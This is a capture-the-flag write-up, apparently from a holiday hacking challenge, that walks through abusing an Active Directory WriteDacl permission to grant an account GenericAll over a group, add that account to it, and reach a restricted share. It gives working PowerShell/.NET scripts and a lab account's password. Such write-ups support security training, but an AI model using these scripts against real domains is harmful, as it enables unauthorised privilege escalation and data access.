# Pivoting Through the Snow

Using the credentials I discovered for the remote_elf user, I was able to enter a powershell session on `10.128.1.53`

![Enter-PSSession](img/obj8-9/img1.png)

From there, I now had a powershell session on the remote end with access to .NET code. Now I can get busy.

First of all, what are the AD Groups available? I can query this using `Get-ADGroup -Filter * | select DistinguishedName`

![What AD Groups available?](img/obj8-9/img2.png)

Interesting...I wonder if I have any tasty access capabilities on some of these groups...

After looking through a bunch, I discovered that I do have access!

Lookie lookie!

![Lookie lookie!](img/obj8-9/img3.png)

Using:
```powershell
$ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString
$domainDirEntry.get_ObjectSecurity().Access | Where-Object IdentityReference -eq 'ELFU\remote_elf'
```

I have `WriteDacl` access to the Research Department!

Giving myself access...
![Giving myself access](img/obj8-9/img4.png)

aka:

```powershell
Add-Type -AssemblyName System.DirectoryServices
$ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
$username = "fkhcuqviyc"
$nullGUID = [guid]'00000000-0000-0000-0000-000000000000'
$propGUID = [guid]'00000000-0000-0000-0000-000000000000'
$IdentityReference = ( New-Object System.Security.Principal.NTAccount("elfu.local\$username")).Translate([System.Security.Principal.SecurityIdentifier])
$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule ( $IdentityReference, ([System.DirectoryServices.ActiveDirectoryRights] "GenericAll"), ([System.Security.AccessControl.AccessControlType] "Allow"), $propGUID, $inheritanceType, $nullGUID )
$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString
$secOptions = $domainDirEntry.get_Options()
$secOptions.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl
$domainDirEntry.RefreshCache()
$domainDirEntry.get_ObjectSecurity().AddAccessRule($ACE)
$domainDirEntry.CommitChanges()
$domainDirEntry.dispose()
```

Confirming I have GenericAll access...

![Confirming I have GenericAll](img/obj8-9/img5.png)

Now to add the user to the group!

![Add a user](img/obj8-9/img6.png)

or

```powershell
Add-Type -AssemblyName System.DirectoryServices
$ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
$username = "fkhcuqviyc"
$password = "Biqhxtixe#"
$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString, $username, $password
$user = New-Object System.Security.Principal.NTAccount("elfu.local\$username")
$sid = $user.Translate([System.Security.Principal.SecurityIdentifier])
$b = New-Object byte[] $sid.BinaryLength
$sid.GetBinaryForm($b,0)
$hexSID = [BitConverter]::ToString($b).Replace('-','')
$domainDirEntry.Add("LDAP://<SID=$hexSID>")
$domainDirEntry.CommitChanges()
$domainDirEntry.dispose()
```

Confirming I'm in the group...

`get-ADGroupMember "CN=Research Department,CN=Users,DC=elfu,DC=local" | where-object name -eq 'fkhcuqviyc'`

![Confirming I'm in the group](img/obj8-9/img7.png)

So...can I now access the share?

![Can I access?](img/obj8-9/img8.png)

Yup!